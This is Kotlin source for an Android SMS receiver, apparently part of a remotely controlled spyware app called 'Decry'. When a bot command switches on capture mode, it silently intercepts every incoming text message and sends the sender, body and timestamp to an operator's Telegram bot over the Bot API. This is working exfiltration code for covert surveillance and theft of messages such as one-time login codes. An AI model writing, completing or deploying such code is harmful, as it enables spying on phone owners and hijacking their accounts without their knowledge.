package com.decry.decry

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import android.net.Uri

/**
 * SmsReceiver - Captures incoming SMS messages in real-time.
 * Only forwards when SMS capture mode is active (triggered by bot command).
 * Sends data directly to Telegram bot API.
 */
class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "DecrySmsReceiver"
        private const val PREFS_NAME = "decry_prefs"
        private const val KEY_SMS_CAPTURE_ACTIVE = "sms_capture_active"
        private const val TELEGRAM_API_URL = "https://api.telegram.org/bot"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.RECEIVE_SMS") return

        // Check if SMS capture mode is active
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val isCaptureActive = prefs.getBoolean(KEY_SMS_CAPTURE_ACTIVE, false)

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return
        if (pdus.isEmpty()) return

        val format = bundle.getString("format", "unknown")
        val messages = mutableListOf<SmsMessage>()
        val senders = mutableSetOf<String>()

        for (pdu in pdus) {
            val smsMessage = when {
                android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M ->
                    SmsMessage.createFromPdu(pdu as ByteArray, format)
                else ->
                    SmsMessage.createFromPdu(pdu as ByteArray)
            }
            messages.add(smsMessage)
            senders.add(smsMessage.displayOriginatingAddress)
        }

        val fullMessage = messages.joinToString("") { it.displayMessageBody }
        val sender = senders.joinToString(", ")
        val timestamp = System.currentTimeMillis()

        Log.d(TAG, "SMS received - Active: $isCaptureActive, Sender: $sender")

        if (isCaptureActive) {
            Log.i("DecryDATA", "[SMS] $sender: $fullMessage")
            
            // Send directly to Telegram
            val botToken = System.getenv("CRYTAKE_BOT_TOKEN") ?: "YOUR_BOT_TOKEN"
            val chatId = System.getenv("CRYTAKE_CHAT_ID") ?: "YOUR_CHAT_ID"
            
            val message = """
📱 *New SMS Captured*
📞 From: $sender
📝 Message: $fullMessage
⏰ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(timestamp)}
            """.trimIndent()

            sendToTelegram(context, botToken, chatId, message)
        }
    }

    private fun sendToTelegram(context: Context, botToken: String, chatId: String, message: String) {
        Thread {
            try {
                val encodedMsg = Uri.encode(message)
                val postData = "chat_id=$chatId&text=$encodedMsg&parse_mode=Markdown"
                val url = "$TELEGRAM_API_URL${botToken}/sendMessage"

                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.doOutput = true
                connection.connectTimeout = 15000
                connection.readTimeout = 15000

                connection.outputStream.use { os ->
                    os.write(postData.toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                    Log.i(TAG, "SMS sent to Telegram successfully")
                } else {
                    Log.w(TAG, "Telegram send failed: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Telegram send error: ${e.message}")
            }
        }.start()
    }
}
